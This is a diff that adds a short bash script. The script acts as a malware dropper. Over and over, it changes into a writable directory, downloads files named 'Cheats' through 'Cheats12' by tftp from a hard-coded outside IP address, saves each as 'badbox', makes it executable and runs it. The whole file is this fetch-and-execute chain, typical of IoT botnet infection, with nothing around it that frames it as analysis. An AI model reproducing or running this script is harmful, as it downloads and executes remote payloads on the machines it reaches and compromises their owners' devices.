@@ -1,0 +1,15 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats -g 5.152.211.70;cat Cheats >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats2 -g 5.152.211.70;cat Cheats2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats3 -g 5.152.211.70;cat Cheats3 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats4 -g 5.152.211.70;cat Cheats4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats5 -g 5.152.211.70;cat Cheats5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats6 -g 5.152.211.70;cat Cheats6 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats7 -g 5.152.211.70;cat Cheats7 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats8 -g 5.152.211.70;cat Cheats8 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats9 -g 5.152.211.70;cat Cheats9 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats10 -g 5.152.211.70;cat Cheats10 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats11 -g 5.152.211.70;cat Cheats11 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r Cheats12 -g 5.152.211.70;cat Cheats12 >badbox;chmod +x *;./badbox
